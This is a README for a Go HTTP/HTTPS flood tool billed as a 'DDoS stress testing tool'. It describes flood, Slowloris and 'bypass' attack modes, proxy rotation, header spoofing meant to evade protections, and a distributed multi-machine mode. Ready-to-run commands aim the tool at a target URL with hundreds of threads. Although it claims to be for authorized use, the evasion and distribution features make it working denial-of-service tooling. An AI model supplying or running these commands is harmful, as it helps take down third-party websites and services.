# README.md

# Layer7 DDoS Stress Testing Tool

Advanced Layer7 (HTTP/HTTPS) stress testing tool for authorized security assessments and infrastructure validation.

## Features

- **Multiple Attack Vectors**: Flood, Slowloris, Bypass, Mixed strategies
- **High Performance**: Goroutine-based concurrency with rate limiting
- **Proxy Support**: HTTP, SOCKS5 proxy with rotation pools
- **Header Randomization**: Randomized User-Agents, headers, referer spam
- **Bypass Techniques**: X-Forwarded-For spoofing, HTTP/2, packet fragmentation
- **Real-time Statistics**: RPS, latency, status code distribution
- **Configurable**: YAML configuration with command-line overrides

## Installation

```bash
git clone https://github.com/stresstest/layer7-flood
cd layer7-flood
make deps
make build
```
## Quick Start

```bash
# Basic GET flood
./bin/layer7-flood -target http://target.com -threads 100 -duration 30

# Advanced with custom config
./bin/layer7-flood -config configs/advanced.yaml

# Mixed attack type
./bin/layer7-flood -target https://target.com -attack mixed -threads 500 -duration 60
```
## Attack Types 
```bash
Type	Description
flood	High-volume HTTP request flood
slowloris	Slowloris - holds connections open with partial headers
bypass	Bypass techniques with spoofed headers
mixed	Rotates between all strategies
```
## Configuration 
```bash
-target      Target URL
-threads     Concurrent workers
-duration    Attack duration (seconds)
-rate        Requests per second per thread
-attack      Attack type (flood/slowloris/bypass/mixed)
-proxy       Proxy URL (socks5://127.0.0.1:9050)
```
## Distributed Mode
```bash
Using the distributed script:

bash
./scripts/distributed.sh http://target.com 60
Or manually across machines:

bash
# On each worker
./layer7-flood -target http://target.com -threads 200 -duration 60
```

